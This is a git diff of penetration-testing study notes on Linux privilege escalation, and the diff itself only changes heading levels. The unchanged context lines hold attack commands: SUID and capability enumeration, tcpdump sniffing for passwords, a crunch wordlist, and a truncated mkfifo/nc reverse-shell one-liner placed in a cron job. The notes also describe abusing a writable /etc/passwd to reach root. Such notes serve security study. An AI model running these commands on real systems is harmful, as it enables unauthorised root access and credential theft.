@@ -1,16 +1,16 @@
 # Module 17: Linux Privilege Escalation
 
-### Enumerating Linux
+## Enumerating Linux
 
 A **very** useful site for privilege escalation:
 
 {% embed url="https://gtfobins.github.io/" %}
 
-#### Understanding Files and Users Privileges on Linux
+### Understanding Files and Users Privileges on Linux
 
 File permissions, nothin' fancy to add.
 
-#### Manual Enumeration
+### Manual Enumeration
 
 ```bash
 # Various places to gather information
@@ -35,14 +35,14 @@ kali@kali:~$ /sbin/modinfo <module> # Gather additional information on a kernel 
 kali@kali:~$ find / -perm -u=s -type f 2>/dev/null # Finding all files with the SUID bit set
 ```
 
-#### Automated Enumeration
+### Automated Enumeration
 
 Bash script to check for privilege escalation vectors: `/usr/bin/unix-privesc-check`\
 Note: This runs via /bin/sh by default, run with bash to avoid issues with if statements.
 
-### Exposed Confidential Information
+## Exposed Confidential Information
 
-#### Inspecting User Trails
+### Inspecting User Trails
 
 Check environment variables via `env`, dig into where they come from if important information is stored to validate it.
 
@@ -55,7 +55,7 @@ kali@kali:~$ crunch 6 6 -t Lab%%% > wordlist
 ```
 {% endcode %}
 
-#### Inspecting Service Footprints
+### Inspecting Service Footprints
 
 Watching for processes that may be started with important information:
 
@@ -69,9 +69,9 @@ If we have privileges to capture network traffice:
 kali@kali:~$ sudo tcpdump -i <interface> -A | grep -i 'pass'
 ```
 
-### Insecure File Permissions
+## Insecure File Permissions
 
-#### Abusing Cron Jobs
+### Abusing Cron Jobs
 
 Searching syslog for cronjobs (also reviewing **/var/log/cron.log**):
 
@@ -86,7 +86,7 @@ kali@kali:~$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc your.li
 ```
 {% endcode %}
 
-#### Abusing Password Authentication
+### Abusing Password Authentication
 
 If the **/etc/passwd** file is writable, we can abuse this due to Linux using authentication here prior to **/etc/shadow** for backwards compatability.
 
@@ -105,9 +105,9 @@ root@debian-privesc:~# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-### Insecure System Components
+## Insecure System Components
 
-#### Abusing Setuid Binaries and Capabilities
+### Abusing Setuid Binaries and Capabilities
 
 Searching for binaries with capability misconfigurations:
 
@@ -116,7 +116,7 @@ kali@kali:~$ /usr/sbin/getcap -r / 2>/dev/null
 kali@kali:~$ find / -type f -perm -u=s -user root 2>/dev/null
 ```
 
-#### Abusing Sudo
+### Abusing Sudo
 
 See what commands can be potentially abused via sudo:
 
@@ -124,7 +124,7 @@ See what commands can be potentially abused via sudo:
 kali@kali:~$ sudo -l
 ```
 
-#### Exploiting Kernel Vulnerabilities
+### Exploiting Kernel Vulnerabilities
 
 {% hint style="warning" %}
 Kernel exploits can be volatile, be careful just tossing them around.
